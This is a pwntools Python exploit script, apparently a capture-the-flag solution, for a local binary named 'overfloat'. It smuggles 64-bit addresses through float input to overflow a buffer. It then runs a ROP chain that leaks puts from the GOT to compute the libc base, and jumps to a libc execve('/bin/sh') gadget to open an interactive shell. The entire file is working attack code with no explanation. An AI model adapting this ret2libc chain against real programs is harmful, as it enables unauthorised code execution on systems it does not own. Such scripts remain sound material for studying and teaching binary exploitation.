from pwn import *
import struct

target = process("./overfloat")
elf = ELF("./overfloat")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

address = {}
address["puts of plt"] = elf.symbols["puts"]
address["puts of got"] = elf.got["puts"]
address["main of start"] = 0x400993  # get from Ghidra

offset = {}
offset["execve('/bin/sh', r12, r13)"] = 0xcbd1a
offset["puts"] = libc.symbols["puts"]

gadget = {}
gadget["pop rdi ; ret"] = 0x400a83
gadget["pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"] = 0x400a7c


def uf(x): return struct.unpack('f', x)[0]


def send(x):
  """
  >>> bin((2**32)-1)
  '0b11111111111111111111111111111111'
  >>> len(bin((2**32)-1).lstrip('0b'))
  32
  """
  v1 = x & ((2**32) - 1)
  v2 = x >> 32
  target.sendline(str(uf(p32(v1))))
  target.sendline(str(uf(p32(v2))))


def fill_buffer():
  for _ in range(7):
    send(0xdeadbeefdeadbeef)


def leak_libc_base():
  fill_buffer()
  send(gadget["pop rdi ; ret"])
  send(address["puts of got"])
  send(address["puts of plt"])
  send(address["main of start"])
  target.sendline("done")
  target.recvuntil('BON VOYAGE!\n')
  leak = target.recv(6)
  address["libc"] = u64(leak + b"\x00" * (8-len(leak))) - offset["puts"]


def exec_sh():
  fill_buffer()
  send(gadget["pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret"])
  send(0x0)
  send(0x0)
  send(0x0)
  send(0x0)
  send(address["libc"] + offset["execve('/bin/sh', r12, r13)"])
  target.sendline('done')


def main():
  leak_libc_base()
  exec_sh()
  target.interactive()


if __name__ == "__main__":
  main()
